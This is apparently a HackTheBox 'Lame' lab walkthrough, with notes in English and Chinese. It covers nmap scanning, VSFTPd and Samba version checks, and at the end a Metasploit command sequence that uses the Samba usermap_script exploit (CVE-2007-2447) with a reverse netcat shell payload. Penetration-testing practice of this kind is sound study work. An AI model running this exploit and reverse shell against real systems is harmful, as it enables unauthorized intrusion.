HackTheBox

1.How many of the nmap top 1000 TCP ports are open on the remote host?

![image](https://github.com/user-attachments/assets/7a33649b-012d-4895-9da0-32f59dd6302d)

執行畫面

![image](https://github.com/user-attachments/assets/8d83f47a-87e8-48e8-8658-699d7c09fa08)

ans:4

2.What version of VSFTPd is running on Lame?

![image](https://github.com/user-attachments/assets/37503d04-baa6-4d9c-9a9b-000583c989a6)

執行畫面

![image](https://github.com/user-attachments/assets/fe00ac21-ba10-41cf-85d2-028db69fb7d0)

ans:2.3.4

3.There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?
  VSFTPd 2.3.4 的後門漏洞在這台 Lame 機器上是否可被成功利用？

  ![image](https://github.com/user-attachments/assets/dda3ede2-df54-4fde-9118-e1937bea4c48)

執行畫面

  ![image](https://github.com/user-attachments/assets/5bdf18ac-f39e-4bc8-95b2-bba98ef8a4a4)

  ![image](https://github.com/user-attachments/assets/6f6b9a00-1239-4e63-b2f8-ccde5d3d4ec4)

執行畫面

  ![image](https://github.com/user-attachments/assets/f838a785-b551-46e4-8646-dea137aee549)

  ![image](https://github.com/user-attachments/assets/ee3c085d-fb0b-4715-88bb-485743bf4ef9)

ans:No

4.What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".
  題目要求你找出在 Lame 靶機 上運行的 Samba（SMB）伺服器版本號，只填寫 數字部分，不要包含像 -Debian 的發行版本資訊。

  ![image](https://github.com/user-attachments/assets/a50f0009-4268-41bd-802d-1dfc4cdc4e3f)
  
  執行畫面
  
  ![image](https://github.com/user-attachments/assets/fa70969f-aeff-4b76-9276-4c7ab9ab4ebe)

  ![image](https://github.com/user-attachments/assets/f0b951f0-3884-41aa-8aef-51feed9fba26)
  
  執行畫面 
  
  ![image](https://github.com/user-attachments/assets/3004d88e-1ee3-499b-ad98-d7fc5621d6f4)

知道版本號，就可以從GOOGLE查該版本的CVE漏洞使用

  ![image](https://github.com/user-attachments/assets/308c8dfc-1b0c-44b8-8485-245a85b0fbab)


5.攻擊流程
Submit the flag located in the makis user's home directory.

![image](https://github.com/user-attachments/assets/690b98e0-ea7a-44a4-8add-b4c0feb760cb)

執行畫面 

![image](https://github.com/user-attachments/assets/b3bd4273-1e2d-4008-9f14-ab16520f7b11)

無法確認版本，改用smbclient

![image](https://github.com/user-attachments/assets/66a0b06c-2804-481f-9d28-77817fd3229a)

找出版本為3.0.20

![image](https://github.com/user-attachments/assets/e62836e2-ec70-40af-8ddc-c6cfed281760)

![image](https://github.com/user-attachments/assets/3abc2f22-f81f-4749-bc2c-1e97e0a56036)




<pre> ```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <IP>
run
  ``` </pre>

  啟動 Metasploit 主控台工具，用來執行滲透模組。
  選擇針對 CVE-2007-2447 的 Samba 利用模組。
  RHOSTS：遠端目標主機 IP。
  使用最簡單的 Linux shell payload：反向連線給你一個 Netcat shell。
  LHOST 是你的 Kali 機器的 VPN IP，讓靶機知道要連回哪裡。
  設定你開啟 Netcat 來接收 shell 的 port。
  送出 exploit，嘗試利用漏洞。



  

  
